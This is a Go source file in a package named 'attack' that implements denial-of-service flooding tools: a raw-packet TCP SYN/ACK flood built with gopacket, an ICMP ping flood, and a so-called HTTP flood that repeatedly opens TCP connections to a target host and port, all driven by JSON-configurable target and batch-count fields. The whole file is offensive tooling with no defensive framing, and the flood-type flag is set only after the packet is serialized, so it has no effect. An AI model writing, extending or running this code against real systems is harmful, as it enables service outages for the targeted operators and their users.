package attack

import (
	"fmt"
	"log"
	"net"
	"strconv"
	"time"

	"github.com/go-ping/ping"
	"github.com/google/gopacket"
	"github.com/google/gopacket/examples/util"
	"github.com/google/gopacket/layers"
)

type DDOS struct {
	Host             string `json:"host"`
	Port             int16  `json:"port"`
	Packetbatchcount int64  `json:"packet_batch_count"`
	AttackType       string `json:"attack_type"`
}

func (a *DDOS) TCPAttack() {

	defer util.Run()()

	// XXX create tcp/ip packet
	srcIP := net.ParseIP("127.0.0.1")
	dstIP := net.ParseIP(a.Host)
	//srcIPaddr := net.IPAddr{
	//  IP: srcIP,
	//}
	dstIPaddr := net.IPAddr{
		IP: dstIP,
	}
	ipLayer := layers.IPv4{
		SrcIP:    srcIP,
		DstIP:    dstIP,
		Protocol: layers.IPProtocolTCP,
	}
	tcpLayer := layers.TCP{
		SrcPort: layers.TCPPort(666),
		DstPort: layers.TCPPort(a.Port),
		SYN:     true,
	}
	tcpLayer.SetNetworkLayerForChecksum(&ipLayer)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	err := gopacket.SerializeLayers(buf, opts, &ipLayer, &tcpLayer)
	if err != nil {
		log.Println("Error while serializing data")
	}
	if a.AttackType == "1" {
		tcpLayer.SYN = true
		// SYN Flood -> 1
	} else if a.AttackType == "2" {
		tcpLayer.ACK = true
		// ACK Flood -> 2
	}
	//send packet
	totalPackets := a.Packetbatchcount * 100
	for totalPackets > 0 {
		ipConn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
		if err != nil {
			log.Println("Error while listening for connection " + err.Error())
		}
		_, err = ipConn.WriteTo(buf.Bytes(), &dstIPaddr)
		if err != nil {
			log.Println("Error while sending data " + err.Error())
		}
		log.Print("packet sent!")
		totalPackets = totalPackets - 1
	}

}

func (a *DDOS) ICMPAttack() {
	// ICMP Flood -> 3
	totalPackets := 10 * a.Packetbatchcount
	for totalPackets > 0 {
		pinger, err := ping.NewPinger(a.Host)
		if err != nil {
			log.Println("Error while creating pinger object " + err.Error())
		}
		pinger.Count = 10
		pinger.Timeout = time.Second * 20
		err = pinger.Run()
		if err != nil {
			log.Println("Error while executing ICMP Flood attack " + err.Error())
		}
		statistics := pinger.Statistics()
		fmt.Println(statistics)
		totalPackets = totalPackets - 10
	}
}

func (a *DDOS) HttpFlood() {
	//Http Flood -> 4
	totalPackets := a.Packetbatchcount * 10
	target := a.Host + ":" + strconv.Itoa(int(a.Port))
	for totalPackets > 0 {
		con, err := net.Dial("tcp", target)
		if err != nil {
			log.Println("Http request failed " + err.Error())
		} else {
			con.Close()
		}
		fmt.Println(totalPackets)
		totalPackets = totalPackets - 1
	}
}
